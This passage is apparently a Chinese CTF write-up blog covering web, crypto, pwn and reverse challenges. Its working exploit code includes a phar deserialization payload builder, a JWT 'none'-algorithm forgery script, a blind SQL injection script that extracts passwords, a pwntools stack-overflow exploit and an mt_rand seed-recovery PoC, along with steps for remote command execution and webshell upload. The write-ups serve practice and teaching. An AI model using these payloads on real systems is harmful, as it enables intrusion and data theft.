白虎组]PicDown给了个接口可以文件下载，我傻了一上来就伪协议读取文件，后来才发现这不是 php，先试着读取 &#x2F;etc&#x2F;passwd,成功了，可以直接下载。然后查看配置文件 /proc/self/cmdline cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令： 也就是说这里能看到一些启动应用进程的命令，下载打开 1python2 app.py 说明这个是 python 的应用 法一：先下载源码 app.py 看看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;search.html&#x27;)@app.route(&#x27;/page&#x27;)def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#x27;application/octet-stream&#x27;) response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#x27;search.html&#x27;, res=value)@app.route(&#x27;/no_one_know_the_manager&#x27;)def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) 可以看到 &#x2F;no_one_know_the_manager 路由下可以任意代码执行，前提是知道 SECRET_KEY ，而 SECRET_KEY 来自于 &#x2F;tmp&#x2F;secret.txt，这个文件已经被删除了，不过这个文件打开了就没关闭，还是会存在内存当中，会创建文件描述符，我们读取文件描述符里的内容就行，proc&#x2F;self&#x2F;fd&#x2F;xx fd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容 0,1,2 我们都知道，那这个文件的文件描述符就是 3 了。读取 &#x2F;proc&#x2F;self&#x2F;fd&#x2F;3,就能得到 SECRET_KEY，得到了然后执行 shell 无回显直接外带就行了 法二：非预期读取 &#x2F;flag [CISCN2019 华北赛区 Day1 Web1]Dropbox打开网站，先注册再登录，有一个文件上传的点，且只让上传 jpg，png，gif。这个改一下 Content-Type: image/jpg 就可以绕过。上传成功后有个下载的 api ，可以实现文件读取。 1filename=/etc/passwd 成功读取配置文件，想读 &#x2F;flag,&#x2F;flag.txt 的时候失败了，读一下源码。 index.php 1234567&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#x27;sandbox&#x27;]);$a-&gt;Name();$a-&gt;Size();?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; upload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;include &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123; $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $pos = strrpos($filename, &quot;.&quot;); if ($pos !== false) &#123; $filename = substr($filename, 0, $pos); &#125; $fileext = &quot;.gif&quot;; switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123; case &#x27;image/gif&#x27;: $fileext = &quot;.gif&quot;; break; case &#x27;image/jpeg&#x27;: $fileext = &quot;.jpg&quot;; break; case &#x27;image/png&#x27;: $fileext = &quot;.png&quot;; break; default: $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); die(); &#125; if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123; $dst = $_SESSION[&#x27;sandbox&#x27;] . $filename . $fileext; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125; else &#123; $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125;&#125;?&gt; download.php 123456789101112131415161718192021222324&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123; Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo &quot;File not exist&quot;;&#125;?&gt; delete.php 12345678910111213141516171819202122232425262728&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);&#125; else &#123; Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);&#125;?&gt; 可以发现 download 页面设置 1ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;); 所以我们是读不到除了当前页面、&#x2F;etc、&#x2F;tmp 这三个目录，这里就不会写了，直接看题解吧。 题解说可以从 delete.php 入手 1if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) 我们跟进 open 函数，在 class.php 的 File 类里 12345678public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125;&#125; 然后 file_exists 会触发 phar 反序列化 正好 User 类有一个 123public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; 而 File 类里 close 方法恰好可以文件包含 123public function close() &#123; return file_get_contents($this-&gt;filename);&#125; 这样就避免从 download 页面触发 close，转而由 delete api 触发，可是没有输出，所以还得找链子。 注意到 FileList 类 的 __destruct 输出了什么，先看构造函数。创建了一个 results 二维数组，一维是 $file-&gt;name()，也就是文件名，二维在 __call 里实现 ，是 $file-&gt;$func(),而 $func 正好就是 call 传来的参数。 那我们是不是就能构造这样一条链 1User::__destruct -&gt; FileList::close -&gt; FileList::call -&gt; File::close -&gt; FileList::__destruct 然后输出。 构造 phar 123456789101112131415161718192021222324252627&lt;?phpunlink(&#x27;phar.phar&#x27;);class User &#123; public $db;&#125;class FileList &#123; private $files; public function __construct() &#123; $this-&gt;files = array(new File()); &#125;&#125;class File &#123; public $filename=&quot;/flag.txt&quot;;&#125;$a = new User();$b = new FileList();$a -&gt; db = $b;$phar = new Phar(&#x27;phar.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;xxx&#x27;);$phar-&gt;stopBuffering();?&gt; 然后上传，改名成立 phar.jpg 后，在删除位置抓包，改名为 1filename=phar://phar.jpg 得到 flag。 [b01lers2020]Welcome to Earth一开始没什么技术水平，不断 ctrl + u 查看源码，然后找路由，找 js。最后在 &#x2F;fight&#x2F; 找到 &#x2F;static&#x2F;js&#x2F;fight.js 123456789101112131415161718// Run to scramble original flag//console.log(scramble(flag, action));function scramble(flag, key) &#123; for (var i = 0; i &lt; key.length; i++) &#123; let n = key.charCodeAt(i) % flag.length; let temp = flag[i]; flag[i] = flag[n]; flag[n] = temp; &#125; return flag;&#125;function check_action() &#123; var action = document.getElementById(&quot;action&quot;).value; var flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]; // TODO: unscramble function&#125; 由于不知道 key 值，只能爆破了。已知 开头 pctf&#123; 结尾 &#125; 123456789101112from itertools import permutationsimport reflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]# 对flag字典里的内容进行排列组合item = permutations(flag)# 遍历for a in item: k = &#x27;&#x27;.join(list(a)) # 匹配 if re.search(&#x27;^pctf\\&#123;hey[a-zA-z_]+ck!\\&#125;$&#x27;, k): print(k) 1pctf&#123;hey_boys_im_baaaaaaaaaack!&#125; [HFCTF2020]EasyLogin注册完再登录发现有一个 &#x2F;api&#x2F;flag 接口，点击后发现权限不够，应该又要从 cookie 入手了。抓包看到 cookie 字段 1sses:aok=eyJ1c2VybmFtZSI6bnVsbCwiX2V4cGlyZSI6MTcyMTEzMjQ0MTg5MywiX21heEFnZSI6ODY0MDAwMDB9; sses:aok.sig=SvXloEwmT-Q-Lyfpral8kVxv9kQ 拿去 base64 解码再改成 admin 然后发包也没有什么用，那只能从头开始看了 来到登陆注册页面，打开 &#x2F;static&#x2F;js&#x2F;app.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */function login() &#123; const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); const token = sessionStorage.getItem(&quot;token&quot;); $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;) .done(function(data) &#123; const &#123;status&#125; = data; if(status) &#123; document.location = &quot;/home&quot;; &#125; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;);&#125;function register() &#123; const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); $.post(&quot;/api/register&quot;, &#123;username, password&#125;) .done(function(data) &#123; const &#123; token &#125; = data; sessionStorage.setItem(&#x27;token&#x27;, token); document.location = &quot;/login&quot;; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;);&#125;function logout() &#123; $.get(&#x27;/api/logout&#x27;).done(function(data) &#123; const &#123;status&#125; = data; if(status) &#123; document.location = &#x27;/login&#x27;; &#125; &#125;);&#125;function getflag() &#123; $.get(&#x27;/api/flag&#x27;).done(function(data) &#123; const &#123;flag&#125; = data; $(&quot;#username&quot;).val(flag); &#125;).fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;);&#125; 可以看到 koa，说明是 nodejs 的 koa 框架。 注册完再登录抓包 1username=123&amp;password=123&amp;authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcyMTA1MjIyNH0.ZLJcJ-eBcqhEgTS-gRJjNqRrVAhWZzefQk4JWtmMpwc 到这里可以可以猜是 JWT 了，因为是 node 的后台，所以不大可能是 flask session，不过也可以通过代码得知。我们在上一步得到了 koa 框架 可以看到存放路由在 controllers 文件夹下，而且 &#x2F;static&#x2F;js&#x2F;app.js 里的路由从 &#x2F;api&#x2F; 开始的。那么说明控制器下有一个 api.js，访问 &#x2F;controllers&#x2F;api.js （koa 的路由规则），就能得到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586const crypto = require(&#x27;crypto&#x27;);const fs = require(&#x27;fs&#x27;)const jwt = require(&#x27;jsonwebtoken&#x27;)const APIError = require(&#x27;../rest&#x27;).APIError;module.exports = &#123; &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || username === &#x27;admin&#x27;)&#123; throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets = []; &#125; const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || !password) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;); &#125; const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123; if(ctx.session.username !== &#x27;admin&#x27;)&#123; throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;); &#125; const flag = fs.readFileSync(&#x27;/flag&#x27;).toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125;&#125;; 1const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); 可以看到确实是 jwt。 我们把最开始的 authorization&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcyMTA1MjIyNH0.ZLJcJ-eBcqhEgTS-gRJjNqRrVAhWZzefQk4JWtmMpwc 拿去解码 而且我们都知道只要前端 jwt 传递的算法是 none ，那么后端 jwt 解析时就不会按照原有算法进行解析，那我们就可以把 alg 字段设置为 none 来进行绕过 但是这样不行 123if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;); &#125; 不能进这个 if 里面，不然程序直接就结束了。这个 sid 就是 secretid 字段，globals.secrets 也是，我们改成把 secretid 改成数组就行了,js 弱类型，空数组 &lt; 1 &amp;&amp; 空数组 &#x3D;&#x3D; 0。然后 username 字段改成 admin 123456789101112import jwttoken = jwt.encode( &#123; &quot;secretid&quot;: [], &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;iat&quot;: 1721052224 &#125;, algorithm=&quot;none&quot;, key=&quot;&quot;).encode(encoding=&#x27;utf-8&#x27;)print(token) 1eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTcyMTA1MjIyNH0. 得到后登陆时填入再发包 1username=admin&amp;password=123456&amp;authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTcyMTA1MjIyNH0. 返回包得到 12Set-Cookie: sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcyMTEzODY4ODI3MiwiX21heEFnZSI6ODY0MDAwMDB9; path=/; expires=Tue, 16 Jul 2024 14:04:48 GMT; httponlySet-Cookie: sses:aok.sig=Ylj_bYj_RHpp3OgQU_RN9mfEA60; path=/; expires=Tue, 16 Jul 2024 14:04:48 GMT; httponlyzaba 整理一下，保留我们要的 cookie 12sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcyMTEzODY4ODI3MiwiX21heEFnZSI6ODY0MDAwMDB9sses:aok.sig=Ylj_bYj_RHpp3OgQU_RN9mfEA60 然后访问 &#x2F;api&#x2F;flag 抓包 替换上述 cookie 字段，然后发包得到 flag [CISCN2019 总决赛 Day2 Web1]Easyweb打开登录页面，没看出什么，直接扫得到 robots.txt 12User-agent: *Disallow: *.php.bak 可以下载备份文件，主页登陆抓包看到有个 image.php,下载来看看 123456789101112131415161718&lt;﻿?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); 可以看到应该是可以 sql 注入的，我们让 id&#x3D;\\0 这样就能只剩下一个 ,把 $id 后面那个单引号注释掉了，和 $path 前面那个单引号构造闭合，然后就能注入了，但是 image.php 只会返回图片或者啥也没有，所以只能盲注了 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;http://5e672981-2f2f-4ad4-9e40-2ef1a55c0b1f.node5.buuoj.cn:81/image.php?id=\\\\0&amp;path= or &quot;result = &quot;&quot;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # 查数据库 ciscnfinal # payload = &quot;select database()&quot; # 查表 images,users # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c&quot; # 查字段 username,password # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;0x7573657273&#x27;&quot; # 查flag admin payload = &quot;select group_concat(password) from users&quot; strs = f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) %23&quot; r = requests.get(url+strs) if &quot;JFIF&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) 得到账号密码后登录，发现有文件上传，先上传一张图，返回一条路径，访问发现是一个日志文件.php,记录了我们上传的文件名。 既然这个文件是 php 了，那么直接在文件名处写写🐎，然后访问日志文件即可拿到 shell","tags":["ctf","刷题","buu","sql","报错注入","二次注入","xxe","内网","ssrf","php 特性","python","文件包含","文件上传","phar 反序列化","jwt 伪造","koa"],"categories":["CTF"]},{"title":"某场CTF解题记录","path":"/2024/07/17/ctf/GYBCTF/","content":"很可惜有一道逆向就差一点解出来 Webweb1访问robots.txt 然后访问 &#x2F;robot-nurses 再下拉到最后一行 web4访问 robots.txt 1234567891011121314151617181920212223242526&lt;?php include &#x27;flag.php&#x27;; session_start(); $_SESSION[&#x27;seed&#x27;]=&#x27;xxxxxxxxxxxxxxxxx&#x27;; function createToken()&#123; mt_srand($_SESSION[&#x27;seed&#x27;]); $dic = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $token = &#x27;&#x27;; for ( $i = 0; $i &lt;20; $i++ )&#123; $token .= substr($dic,mt_rand(0, strlen($dic) - 1), 1); &#125; $_SESSION[&#x27;token&#x27;]=$token; $top10=substr($token,0,10); echo &#x27;&lt;p class=&quot;p1&quot;&gt;Generate token successfully&lt;/p&gt;&lt;p class=&quot;p2&quot;&gt;鎻愮ず锛氭偍鐨勪护鐗屽墠10浣嶄负锛�&#x27;.$top10.&#x27;&lt;/p&gt;&#x27;; &#125; createToken(); if(isset($_POST[&#x27;token&#x27;]))&#123; if($_POST[&#x27;token&#x27;]==$_SESSION[&#x27;token&#x27;])&#123; echo &#x27;&lt;p class=&quot;p2&quot;&gt;浠ょ墝楠岃瘉鎴愬姛锛岃繖鏄綘鎯宠鐨勶細&#x27;.$flag.&#x27;&lt;/p&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;p class=&quot;p2&quot;&gt;浠ょ墝楠岃瘉澶辫触&lt;/p&gt;&#x27;; &#125; &#125; ?&gt; 一眼 GWCTF 2019 WEB-枯燥的抽奖，搜一下题解 [GWCTF 2019 WEB-枯燥的抽奖_gwctf 2019]枯燥的抽奖 1-CSDN博客 先得出随机值 12345678910str1=&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;str2=&#x27;R9WLuE5hGV&#x27;length = len(str2)res=&#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+&#x27; &#x27;+str(j)+&#x27; &#x27;+&#x27;0&#x27;+&#x27; &#x27;+str(len(str1)-1)+&#x27; &#x27; breakprint(res) 得到种子 POC： 1234567891011&lt;?php$seed = 2107153532;mt_srand($seed);$dic = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$token = &#x27;&#x27;;for ( $i = 0; $i &lt;20; $i++ )&#123; $token .= substr($dic,mt_rand(0, strlen($dic) - 1), 1);&#125;echo $token;?&gt; 得到 token 填入得到 flag Cryptocrypto1png 提示为 hill 加密，010 打开 png 得到密文 CLYCOEXMAYHD。然后 hill 解密 Pwnpwn1在 vul 函数处发现栈溢出点 存在后门函数 get_shell POC: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *from LibcSearcher import *def s(a): io.send(a)def sa(a, b): io.sendafter(a, b)def sl(a): io.sendline(a)def sla(a, b): io.sendlineafter(a, b)def r(): return io.recv()def pr(): print(io.recv())def rl(a): return io.recvuntil(a)def inter(): io.interactive()def debug(): gdb.attach(io) pause()def get_64addr(): return u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_32addr(): return u32(io.recvuntil(b&#x27;\\xf7&#x27;)[-4:])def get_64sb(): return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))def get_32sb(): return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))def get_64sb_libcsearch(): return libc_base + libc.dump(&#x27;system&#x27;), libc_base + libc.dump(&#x27;str_bin_sh&#x27;)def get_32sb_libcsearch(): return libc_base + libc.dump(&#x27;system&#x27;), libc_base + libc.dump(&#x27;str_bin_sh&#x27;)# context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# io = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)io = remote(&quot;111.74.9.131&quot;,10309)padding = 0x30 + 8sh = 0x4008D0payload = flat([padding*b&#x27;a&#x27;],sh)sl(payload)inter() ReRe2查看主函数，发现有两个逻辑处理 1. 输入的 flag 和 0x7FF7B9AE3020 地址处的进行异或 2. v31 处以 0x7FF7B9AE30A0 出的值作为下标，并把 flag 的值赋予给它 然后要求所得值为 “23gJba3au9mnk3c10:0zp8qJr41H39jp”,编写 POC 1234567891011121314151617en = [0x00000053, 0x00000045, 0x0000005C, 0x0000001E, 0x00000050, 0x00000013,0x0000002F, 0x00000078, 0x00000004, 0x00000053, 0x00000058,0x0000004A, 0x00000043, 0x00000001, 0x00000041, 0x0000002A,0x00000008, 0x00000040, 0x00000067, 0x0000002F, 0x0000000C, 0x0000004A, 0x00000012, 0x0000002E,0x00000041, 0x0000006C, 0x00000005, 0x00000054, 0x00000040, 0x00000012, 0x0000005B, 0x0000004F]print(len(en))v = [0x00000004, 0x0000000F, 0x0000000B, 0x0000001E, 0x0000000E, 0x00000014, 0x0000001F, 0x00000009, 0x00000017, 0x00000002, 